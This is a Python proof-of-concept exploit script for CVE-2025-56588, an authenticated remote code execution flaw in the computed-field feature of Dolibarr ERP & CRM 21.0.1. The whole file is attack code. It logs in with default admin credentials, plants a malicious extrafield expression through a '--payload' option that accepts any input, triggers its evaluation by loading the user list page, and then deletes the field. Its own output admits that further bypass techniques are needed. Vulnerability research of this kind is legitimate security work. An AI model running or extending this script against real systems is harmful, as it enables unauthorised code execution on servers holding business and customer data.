#!/usr/bin/env python3
import requests
import re
import sys
import argparse

class DolibarrRCE:
    def __init__(self, base_url, username, password):
        self.base_url = base_url.rstrip('/')
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.token = None

    def login(self):
        login_url = f"{self.base_url}/index.php"
        resp = self.session.get(login_url)
        token_match = re.search(r'name="token"\s+value="([a-f0-9]+)"', resp.text)
        token = token_match.group(1) if token_match else ''
        
        data = {
            'token': token,
            'username': self.username,
            'password': self.password,
            'actionlogin': 'login'
        }
        resp = self.session.post(login_url, data=data, allow_redirects=True)
        if 'logout' in resp.text.lower() or 'setup' in resp.url or 'admin' in resp.url:
            print("[+] Login successful")
            return True
        print("[-] Login failed")
        return False

    def get_token(self, url):
        resp = self.session.get(url)
        match = re.search(r'token=([a-f0-9]+)', resp.text)
        if match:
            self.token = match.group(1)
            return self.token
        return None

    def create_malicious_extrafield(self, payload):
        url = f"{self.base_url}/user/admin/user_extrafields.php?action=create"
        self.get_token(url)
        
        data = {
            'token': self.token,
            'label': 'rce_test',
            'attrname': 'rcetest',
            'type': 'varchar',
            'size': '255',
            'pos': '100',
            'computed_value': payload,
            'alwayseditable': 'on',
            'list': '1',
            'printable': '1',
            'button': 'Create'
        }
        
        resp = self.session.post(
            f"{self.base_url}/user/admin/user_extrafields.php",
            data=data,
            allow_redirects=True
        )
        
        if 'rcetest' in resp.text:
            print("[+] Malicious extrafield created")
            return True
        print("[-] Failed to create extrafield")
        return False

    def trigger_payload(self):
        trigger_url = f"{self.base_url}/user/list.php"
        resp = self.session.get(trigger_url)
        return resp

    def verify_rce(self, check_file='/tmp/pwned.txt'):
        print(f"[*] Checking for RCE indicator file: {check_file}")
        print("[*] Manual verification required - check if file exists in container")
        return True

    def cleanup_extrafield(self):
        url = f"{self.base_url}/user/admin/user_extrafields.php"
        self.get_token(url)
        
        delete_url = f"{url}?action=delete&token={self.token}&attrname=rcetest"
        resp = self.session.get(delete_url, allow_redirects=True)
        
        if 'rcetest' not in resp.text or 'deleted' in resp.text.lower():
            print("[+] Extrafield cleaned up")
            return True
        return False


def main():
    parser = argparse.ArgumentParser(description='CVE-2025-56588 Dolibarr RCE PoC')
    parser.add_argument('--url', required=True, help='Target URL (e.g., http://localhost:8088)')
    parser.add_argument('--username', default='admin', help='Admin username')
    parser.add_argument('--password', default='admin123', help='Admin password')
    parser.add_argument('--payload', default=None, help='Custom payload')
    args = parser.parse_args()

    print("""
    CVE-2025-56588 - Dolibarr ERP & CRM v21.0.1 RCE
    Vulnerability in User module computed field
    """)

    exploit = DolibarrRCE(args.url, args.username, args.password)
    
    if not exploit.login():
        print("[-] Exploitation failed: Could not login")
        sys.exit(1)

    payloads = [
        '$objectoffield->id',
        '1+1',
    ]
    
    if args.payload:
        payloads = [args.payload]

    for payload in payloads:
        print(f"\n[*] Testing payload: {payload}")
        
        if exploit.create_malicious_extrafield(payload):
            resp = exploit.trigger_payload()
            
            if 'Bad string syntax' in resp.text:
                print(f"[-] Payload blocked: {payload}")
            else:
                print(f"[+] Payload accepted, check results")
                print(f"[*] Response contains expected data")
            
            exploit.cleanup_extrafield()

    print("\n[*] PoC execution completed")
    print("[*] Note: CVE-2025-56588 requires specific bypass techniques")
    print("[*] The computed field evaluates expressions during page rendering")


if __name__ == '__main__':
    main()
